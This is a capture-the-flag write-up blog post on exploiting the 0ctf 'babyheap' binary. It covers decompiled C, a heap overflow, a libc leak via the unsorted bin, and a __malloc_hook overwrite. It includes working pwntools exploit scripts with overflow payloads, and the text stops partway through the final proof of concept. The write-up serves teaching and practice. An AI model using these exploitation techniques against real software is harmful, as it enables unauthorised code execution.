@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>Adventures in Heap: Heapoverflow, Leak, and Pwndocker | </title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.80.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cavetownie.github.io/css/index.css">
+<link rel="canonical" href="https://cavetownie.github.io/posts/heapadventures_ep1_baby/">
+<link rel="alternate" type="application/rss+xml" href="" title="">
+
+<header>
+  
+    <a href="https://cavetownie.github.io/" class="title"></a>
+  
+  
+    <nav>
+    
+      <a href="/">Blog</a>
+    
+      <a href="/about/">About</a>
+    
+      <a href="/challenges/">Challenges</a>
+    
+      <a href="/index.xml">RSS</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>Adventures in Heap: Heapoverflow, Leak, and Pwndocker</h1>
+    <time datetime="2021-10-26T00:01:00&#43;02:00">October 26, 2021</time>
+  </header>
+  <h1 id="setup-for-the-lazy">Setup for the lazy</h1>
+<p>As it&rsquo;s difficult to find proper ressources for learning pwn, I&rsquo;ll here do my best to explain my troubles solving the challenge &ldquo;babyheap&rdquo; from 0ctf.
+&ldquo;Babyheap&rdquo; is a challenge in the github repository made by Shellphish called &ldquo;How2Heap&rdquo;, which I can only recommend. It might be close to impossible to solve any of the challenges without prior knowledge, but luckily they link writeups, which can be followed.</p>
+<p>Here&rsquo;s all the files that will be needed for setup:</p>
+<p>Tar archive:</p>
+<p><a href="https://cavetownie.github.io/chall_files/0ctfbabyheap/babyheap.tar">0ctfbabyheap</a></p>
+<p>Untar: <code>tar -xvf babyheap.tar</code></p>
+<p>Now run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">patchelf --set-interpreter ld-2.23.so ./0ctfbabyheap
+patchelf --set-rpath . 0ctfbabyheap
+</code></pre></div><p>And you should be good to go.</p>
+<h1 id="setup-for-good">Setup for good</h1>
+<p>Now while doing this challenge I learnt about &ldquo;pwndocker&rdquo; which is a docker container that&rsquo;s extremely smart for acquiring all these different libc&rsquo;s etc.</p>
+<pre><code>A docker environment for pwn in ctf based on **phusion/baseimage:master-amd64**, which is a modified ubuntu 20.04 baseimage for docker
+</code></pre><p>To run this I use the following one-liner:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -d --rm -h <span style="color:#e6db74">${</span>ctf_name<span style="color:#e6db74">}</span> --name <span style="color:#e6db74">${</span>ctf_name<span style="color:#e6db74">}</span> -v <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>:/ctf/work -p 23946:23946 --cap-add<span style="color:#f92672">=</span>SYS_PTRACE skysider/pwndocker 
+</code></pre></div><p>Now to get an interactive shell in the docker that is done like so:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker exec -it <span style="color:#e6db74">${</span>ctf_name<span style="color:#e6db74">}</span> /bin/bash
+</code></pre></div><p>An example could be this time, where we had the challenge name called 0ctfbabyheap:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run -d --rm -h 0ctfbabyheap --name 0ctfbabyheap -v <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>:/ctf/work -p 23946:23946 --cap-add<span style="color:#f92672">=</span>SYS_PTRACE skysider/pwndocker 
+docker exec -it 0ctfbabyheap /bin/bash
+</code></pre></div><p>Then one can get the libc&rsquo;s needed from there:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@test:/ctf/work# cp /glibc/2.
+2.19/ 2.23/ 2.24/ 2.27/ 2.28/ 2.29/ 2.30/ 
+</code></pre></div><p>Now run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">patchelf --set-interpreter ld-2.23.so ./0ctfbabyheap
+patchelf --set-rpath . 0ctfbabyheap
+</code></pre></div><p>To kill the docker run <code>docker kill ${ctf_name}</code>
+Now we&rsquo;re ready for the actual challenge, as if this wasn&rsquo;t troublesome already :)</p>
+<h1 id="reversing-and-bughunting">Reversing and bughunting</h1>
+<p>We can start by opening the binary in Ida, or any other reversing tool for that sake.</p>
+<p>This next part is hard to explain, because it&rsquo;s primarily experience, anyhow, I went in Ida and looked at all the 5 options (functions) the users were given and tried to give proper variable names everywhere to get a better grasp of what was going on. We know that it&rsquo;s a fastbin dup, so immediately we can begin experimenting with double-frees, etc. through trial and error however, we can find out that isn&rsquo;t going to work. That must mean, that somewhere user input can be used to cause a vulnerability. We have 2 interesting functions then: allocate, and fill - but primarily fill.</p>
+<p>The fill function we know from a usage standpoint does these things:</p>
+<ol>
+<li>It takes an index</li>
+<li>It takes a size</li>
+<li>It takes some content of that size and reads into the index</li>
+</ol>
+<p>But to use and understand where fill writes, we need to understand how the allocate function works. It does the following:</p>
+<ol>
+<li>Takes a size</li>
+<li>Returns an index</li>
+</ol>
+<p>The code from ida&rsquo;s disassembly, can be seen under*:
+*[comments added and variable names changed]</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">userAllocate</span>(<span style="color:#66d9ef">__int64</span> a1)
+{
+  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> userInput; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>userCallocPtr; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">15</span>; <span style="color:#f92672">++</span>i ) <span style="color:#75715e">// Max index is 15
+</span><span style="color:#75715e"></span>  {
+    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> a1) ) <span style="color:#75715e">// DWORD (4 bytes) eg. 0xdeadbeef 
+</span><span style="color:#75715e"></span>                                       <span style="color:#75715e">// i would seem to be the indice
+</span><span style="color:#75715e"></span>    {
+      printf(<span style="color:#e6db74">&#34;Size: &#34;</span>);
+      userInput <span style="color:#f92672">=</span> getUserNum();
+      <span style="color:#66d9ef">if</span> ( userInput <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+      {
+        <span style="color:#66d9ef">if</span> ( userInput <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4096</span> )
+          userInput <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>; <span style="color:#75715e">// max size
+</span><span style="color:#75715e"></span>        userCallocPtr <span style="color:#f92672">=</span> calloc(userInput, <span style="color:#ae81ff">1uLL</span>); <span style="color:#75715e">// returns a pointer to the heap
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>userCallocPtr )
+          exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); <span style="color:#75715e">// exit if that was unsuccesful
+</span><span style="color:#75715e"></span>
+        <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> a1) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// makes sure to return new indexes
+</span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> userInput; <span style="color:#75715e">// address for the size
+</span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">=</span> userCallocPtr; <span style="color:#75715e">// address for the heap ptr
+</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;Allocate Index %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)i);
+      }
+      <span style="color:#66d9ef">return</span>;
+    }
+  }
+}
+</code></pre></div><p>Now with that in our minds, let&rsquo;s look at the fill function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">userFill</span>(<span style="color:#66d9ef">__int64</span> a1)
+{
+  <span style="color:#66d9ef">__int64</span> userInput; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> result_2; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> userSize; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
+</span><span style="color:#75715e"></span>
+  printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+  userInput <span style="color:#f92672">=</span> getUserNum();
+  userInput_sav <span style="color:#f92672">=</span> userInput; <span style="color:#75715e">// save the input
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)userInput <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">int</span>)userInput <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">15</span> )
+  {
+    userInput <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)userInput <span style="color:#f92672">+</span> a1); <span style="color:#75715e">// same as (24LL * i + a1), as seen in the allocate
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ( (_DWORD)userInput <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> ) <span style="color:#75715e">// if it&#39;s allocated, continue
+</span><span style="color:#75715e"></span>    {
+      printf(<span style="color:#e6db74">&#34;Size: &#34;</span>);
+      userInput <span style="color:#f92672">=</span> getUserNum();
+      userSize <span style="color:#f92672">=</span> userInput;
+      <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)userInput <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> ) <span style="color:#75715e">// if size is more than 0
+</span><span style="color:#75715e"></span>      {
+        printf(<span style="color:#e6db74">&#34;Content: &#34;</span>);
+        userInput <span style="color:#f92672">=</span> sub_11B2(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> userInput_sav <span style="color:#f92672">+</span> a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>), userSize); <span style="color:#75715e">// hmm another function
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">// prototype: sub_11b2((24LL*index+a1+16), size);;
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">// prototype: sub_11b2(callocptr, size); &lt;-- would seem to be a read of some sorts
+</span><span style="color:#75715e"></span>      }
+    }
+  }
+  <span style="color:#66d9ef">return</span> userInput;
+}
+</code></pre></div><p>That sub_11b2 function looks super interesting, let&rsquo;s see what that does (this is the last reversing, i pinky promise):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_11B2</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> a2)
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
+</span><span style="color:#75715e"></span>  ssize_t v4; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a2 ) <span style="color:#75715e">// if no size
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+  <span style="color:#66d9ef">while</span> ( v3 <span style="color:#f92672">&lt;</span> a2 )
+  {
+    v4 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(v3 <span style="color:#f92672">+</span> a1), a2 <span style="color:#f92672">-</span> v3);   <span style="color:#75715e">// read(stdin, callocPtr, size) - as v3 = 0
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+    {
+      v3 <span style="color:#f92672">+=</span> v4; <span style="color:#75715e">// make v3 the size of the read number of characters
+</span><span style="color:#75715e"></span>                <span style="color:#75715e">// the entire while loop just ensures that &#39;size&#39; 
+</span><span style="color:#75715e"></span>                <span style="color:#75715e">// amount of characters is always read. 
+</span><span style="color:#75715e"></span>    }
+    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>_errno_location() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">11</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>_errno_location() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span> )
+    {
+      <span style="color:#66d9ef">return</span> v3;
+    }
+  }
+  <span style="color:#66d9ef">return</span> v3;
+}
+</code></pre></div><p>The interesting thing to note is, that nothing is bounds-checking the size meaning that we have a heap overflow. We can for example allocate 24 bytes first, and then afterwards allocate 100 bytes, the rest of the bytes would overflow the heap, and with this we can cause a fastbin dup.</p>
+<h1 id="pre-exploit-preparation">Pre-exploit preparation</h1>
+<p>Excerpt from &ldquo;Adventures in Heap: Malloc, Free, and Fastbin Dup&rdquo;:</p>
+<p>Fastbins are bins or &ldquo;cups&rdquo;, that hold data based on a freed chunk, this would be the address of the previous allocated space. Consider the following pseudo-code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">a <span style="color:#f92672">=</span> malloc<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> <span style="color:#75715e">#at addr_a</span>
+free<span style="color:#f92672">(</span>a<span style="color:#f92672">)</span> 
+</code></pre></div><p>Now the fastbin will point to the addr_a. There are a variety of fastbins, the exact amount is not important right now, however it&rsquo;s important to note that they differ in sizes, so that there&rsquo;s a fastbin for 0x20 sized chunks, one for 0x30 sized chunks, and so on&hellip;</p>
+<p>That&rsquo;s the knowledge we&rsquo;ve previously acquired, and will be used this time around again. We simply need the top of a fastbin to point somewhere in memory, where we can overwrite and get execution.</p>
+<p>Malloc hooks is a nice target, because it often has a size field, that we&rsquo;ll need to &ldquo;cheat&rdquo; the heap implementation. Malloc hooks is some hooks that gets called everytime malloc does.</p>
+<p>We do however have every protection mechanism enabled:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cave@townie:~/ctf/HeapLAB/0ctfbabyheap-$ checksec 0ctfbabyheap
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/cave/ctf/HeapLAB/0ctfbabyheap-/0ctfbabyheap&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b<span style="color:#e6db74">&#39;.&#39;</span>
+</code></pre></div><p>Problematic, because we now need to leak something - this was the greatest struggle for me during the challenge.</p>
+<p>The plan then becomes:</p>
+<ol>
+<li>Leak</li>
+<li>Overwrite <code>__malloc_hooks</code> with a one_gadget</li>
+<li>Hopefully profit</li>
+</ol>
+<h1 id="exploiting---plan-and-leak">Exploiting - plan and leak</h1>
+<p>Firstly we&rsquo;ll work on the leak. We know that we&rsquo;ll probably have to use the dump function to leak, which takes an index.
+We&rsquo;ll start by trying to get an address from the binary into a fastbin. The reason for this is that fastbins for exploit dev in this case, can be boiled down to this one statement:</p>
+<p><code>&quot;The address at the top of a fastbin, we can write at&quot;</code></p>
+<p>When we allocate with malloc, the binary checks if there&rsquo;s a fastbin available. If there&rsquo;s one ready, it&rsquo;ll use that.
+If we have multiple chunks in the same fastbin, it&rsquo;s LIFO, last in first out. Most recently freed, most recently reallocated.</p>
+<p>To get a binary address into a fastbin, we need to know how we can do that. This was the part I really struggled with. It turns out that you can have an unsorted bin, that when freed will point to a bin in the main arena, which holds an address of malloc_state structure in libc.</p>
+<p>Essentially we can free a chunk which will then be put into the unsorted bin, and then we have the main arena where we have a libc address at.</p>
+<p>To avoid heap coalescing (the top bin is merged with the rest of the heap when freed), we&rsquo;ll add another unused empty chunk at the top.</p>
+<p>Plan:</p>
+<ol>
+<li>Allocate four 0x20 sized chunks</li>
+<li>Allocate a 0x80 sized chunk and a 0x20 sized chunk</li>
+<li>Free chunk two and three</li>
+<li>Use our heap overflow to overwrite chunk two with null</li>
+<li>Use our heap overflow to overwrite chunk three with the LSB of the 0x80 sized chunk</li>
+</ol>
+<p>This way we&rsquo;ll still have two entities in the fastbin, if we didn&rsquo;t make the LSB point to something new, it would point to the data we overwrote with null.</p>
+<ol start="6">
+<li>We use the fourth chunk to change the size field of our 0x80 sized chunk to 0x20</li>
+<li>Allocate twice, now the second index points to our 0x20 sized unsorted bin</li>
+<li>Change the size field back to an unsorted bin</li>
+<li>Free the unsorted bin using it&rsquo;s original index (5)</li>
+<li>Dump the address from libc using the third chunks index (2)</li>
+</ol>
+<p>We cannot write there just yet, as the address is not in the fastbins - but now we have a leak.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f92672">from</span> pwn <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span>
+elfPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./0ctfbabyheap&#34;</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;gnome-terminal&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> 
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript<span style="color:#f92672">=</span>gdbscript)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>(size):
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(f<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{size}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fill</span>(index, pay):
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+    io<span style="color:#f92672">.</span>sendline(str(len(pay)))
+    io<span style="color:#f92672">.</span>sendline(pay)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+    
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump</span>(index):
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index:&#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+    <span style="color:#66d9ef">return</span> data
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#index [0]</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#index [1]</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#index [2]</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#index [3]</span>
+    alloc(<span style="color:#ae81ff">128</span>) <span style="color:#75715e">#unsorted [4]</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#avoid coalescing [5]</span>
+
+    free(<span style="color:#ae81ff">1</span>); free(<span style="color:#ae81ff">2</span>)
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#75715e">#[0]</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#75715e">#[1 flag]</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#75715e">#[1]</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#75715e">#[2 flag]</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#[2 addr]</span>
+
+    fill(<span style="color:#ae81ff">0</span>, payload)
+
+    <span style="color:#75715e"># set unsorted bin to fastbin size</span>
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x31</span>)
+
+    fill(<span style="color:#ae81ff">3</span>, payload)
+
+    alloc(<span style="color:#ae81ff">30</span>)
+    alloc(<span style="color:#ae81ff">30</span>)
+
+    <span style="color:#75715e"># set it back to unsorted bin </span>
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x91</span>)
+    fill(<span style="color:#ae81ff">3</span>, payload)
+
+    free(<span style="color:#ae81ff">4</span>)
+
+    leak <span style="color:#f92672">=</span> u64(dump(<span style="color:#ae81ff">2</span>)[:<span style="color:#ae81ff">8</span>]) <span style="color:#75715e"># this index is used because </span>
+                            <span style="color:#75715e"># we changed index 2 to point </span>
+                            <span style="color:#75715e"># to our unsorted bin.</span>
+    print(<span style="color:#e6db74">&#34;Leak:&#34;</span>,hex(leak))
+
+main()
+
+</code></pre></div><p>Now to find the base we&rsquo;ll simply use vmmap of pwndbg, and find the libc, that is <code>r-xp</code>
+<img src="https://cavetownie.github.io/pictures/vmmapbabyheap.png" alt="vmmapbabyheap"></p>
+<p>Subtract the leak from the base, to get the offset. Add that to the exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">print(<span style="color:#e6db74">&#34;Leak:&#34;</span>,hex(leak))
+libc_base <span style="color:#f92672">=</span> leak<span style="color:#f92672">-</span><span style="color:#ae81ff">0x39bb78</span>
+print(<span style="color:#e6db74">&#34;Base:&#34;</span>,hex(libc_base))
+</code></pre></div><h1 id="exploiting---shell">Exploiting - shell</h1>
+<p>Now we&rsquo;re ready to rumble.
+Let&rsquo;s allocate four chunks of a different size than before. To know the size we&rsquo;ll use <code>find_fake_fast</code> from pwndbg, to find a fake size field in the <code>__malloc_hook</code></p>
+<p>By utilizing this function, we can easily find the right spots we can make an arbitrary write:</p>
+<p><img src="https://cavetownie.github.io/pictures/findfake.png" alt="findfakefast"></p>
+<p>We can see that the size is <code>0x7f</code>. Let&rsquo;s pick 0x70 as our fastbin size. This means that we can allocate 0x70-0x8 as this is our actual usable size (minus the metadeta qword)</p>
+<p>The reasoning for four chunks is:</p>
+<p>Chunk 1: To overflow chunk2 and 3</p>
+<p>Chunk 2: To be freed first, point to chunk 3</p>
+<p>Chunk 3: Freed second, at the top now, put payload here</p>
+<p>Chunk 4: Avoid merging</p>
+<p>Now allocate twice, so that the fastbin is moved out, and the malloc hook is overwritten</p>
+<p>Before the final allocation the fastbins looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">0x70: 0x7fb0b77bfaed <span style="color:#f92672">(</span>_IO_wide_data_0+301<span style="color:#f92672">)</span> ◂— 0xb0b749db00000000
+</code></pre></div><p>The clever reader might notice, that the data on the right, is not actually an address, but the data that we will be able to overwrite after the final allocation.</p>
+<p>Just for explanation sake the <code>_IO_wide_data_0+301</code>, might seem random, but is actually our <code>fake_fast</code> chunk in malloc hooks.</p>
+<p>Now we needed to find some padding, such that we could succesfully overwrite malloc hooks, and not this fake chunk.</p>
+<p>The full POC is then:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f92672">from</span> pwn <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e">#--------Paths----------#</span>
+
+elfPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./0ctfbabyheap&#34;</span>
+
+<span style="color:#75715e">#---------Terminal Settings-----------#</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;gnome-terminal&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#75715e">#---------Input Output type-------------#</span>
+
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript <span style="color:#f92672">=</span> gdbscript) <span style="color:#75715e">#Standard setting for debugging exploit</span>
+<span style="color:#75715e">#io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript, env = {&#34;LD_PRELOAD&#34;: &#34;./libc6_2.27-3ubuntu1_amd64.so&#34;}) #Automatically uses specified libc</span>
+<span style="color:#75715e">#io = remote(&#34;138.68.155.238&#34;, 31292) #Allows for connection to servers</span>
+<span style="color:#75715e">#io = process(elfPath)</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+
+<span style="color:#75715e">#------------Other functions--------------------#</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
